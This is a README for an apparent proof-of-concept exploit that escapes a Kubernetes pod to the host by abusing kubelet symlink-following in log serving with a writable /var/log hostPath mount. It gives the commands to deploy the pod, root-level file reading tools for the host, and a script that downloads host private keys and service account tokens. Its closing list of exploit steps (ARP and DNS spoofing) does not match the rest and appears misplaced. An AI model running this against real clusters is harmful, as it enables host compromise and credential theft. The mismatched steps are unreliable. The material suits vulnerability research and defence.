# Kubelet Exploit For /var/log Mount

Kube-pod-escape is a POC for the an exploit on the symlink following behaviour of logs files serving in the kubelet, in addition with a pod that has a write hostPath mount to /var/log.  
This POC shows the outcome of a pod which uses that mount, and how it can escape to the host machine.  
Further read on this discovery can be done on the following: <link_to_blog>

This repository contains all files and related code for running this exploit.  


## Prerequisites
A Kubernetes cluster, 
Without restriction for retrieving logs with `kubectl logs <pod>`


## Run the exploit

First, create the pod by:
    
```bash
$ kubectl create -f pods/
pod/escaper created
```

After the pod was created, exec into the escaper pod.
```bash
$ kubectl exec -it escaper bash
➜ root@escaper:~/exploit$ lsh
Usage: [cath|lsh] <host_path>
```
### lsh
Works like ls, but using root access on the host machine.
### cath
Works like cat, but using root access on the host machine.

Example:
```bash
$ kubectl exec -it escaper bash
➜ root@escaper:~/exploit$ lsh /proc
1/
10/
10034/
10042/
10047/
....
```

## Extract Sensitive Data
Inside the `~/exploit` folder, there's a python script, which locates and downloads private key files from the host, as well as kubernetes service account tokens.
(to find tokens,the script searches the /var/lib/kubelet/pods folder. this way it can read the mounted token files for each pod that runs on the host)

## Run the script
```bash
$ kubectl exec -it escaper bash
➜ root@escaper:~/exploit$ python find_sensitive_files.py
[*] Got access to kubelet /logs endpoint
[+] creating symlink to host root folder inside /var/log
[*] fetching token files from host
[*] downloaded: /var/lib/kubelet/pods/6d67bed2-abe3-11e9-9888-42010a8e020e/volumes/kubernetes.io~secret/aqua-token-blkpc/token
...
```

The steps of the exploit:
* Deciding whether it can run
* Discovering relevant mac/ip addresses
* ARP spoofing the bridge (and kube-dns in case of direct attack mode)
* DNS proxy requests, and spoofing relevant entries
* Restoring all network on CTRL+C interrupt


